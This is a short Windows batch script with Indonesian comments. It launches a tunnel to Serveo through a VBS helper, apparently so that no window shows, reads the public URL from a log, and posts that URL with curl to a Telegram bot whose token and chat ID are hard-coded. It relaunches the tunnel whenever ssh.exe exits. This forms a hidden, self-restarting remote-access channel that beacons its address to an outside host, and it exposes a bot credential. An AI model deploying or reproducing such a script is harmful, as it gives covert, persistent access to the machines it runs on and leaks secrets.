@echo off
setlocal enabledelayedexpansion

:: Konfigurasi Telegram
set "BOT_TOKEN=7450852198:AAEJrO8y3gqaWFECOW87VtOpOtx13_WwrXg"
set "CHAT_ID=8107240151"

:: Lokasi file log
set "SCRIPT_DIR=%~dp0"
set "LOGFILE=%SCRIPT_DIR%serveo_log.txt"

:RETRY
:: Cek koneksi internet
ping 8.8.8.8 -n 1 >nul 2>&1
if errorlevel 1 (
    echo [!] Tidak ada koneksi internet. Coba lagi 10 detik...
    timeout /t 10 >nul
    goto RETRY
)

echo [+] Koneksi tersedia, jalankan Serveo

:: Hapus file log lama jika ada
if exist "%LOGFILE%" del "%LOGFILE%"

:: Jalankan Serveo
cscript //nologo "%SCRIPT_DIR%hidencmd.vbs"


:: Tunggu 5 detik agar Serveo berjalan
timeout /t 5 >nul

:: Cari URL Serveo
set "URL="
for /f "delims=" %%A in ('findstr /r "https://[a-zA-Z0-9]*\.serveo\.net" "%LOGFILE%"') do (
    set "URL=%%A"
    goto FOUND
)

:NOT_FOUND
echo [!] Serveo URL tidak ditemukan.
goto WAIT_LOOP

:FOUND
echo [+] Serveo URL ditemukan: !URL!

:: Kirim ke Telegram
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=Serveo aktif: !URL!"

:WAIT_LOOP
:: Tunggu hingga proses ssh mati (loop cek setiap 10 detik)
:CHECK_SSH
tasklist | findstr /i "ssh.exe" >nul
if errorlevel 1 (
    echo [!] Serveo disconnected, ulangi...
    goto RETRY
)
timeout /t 10 >nul
goto CHECK_SSH
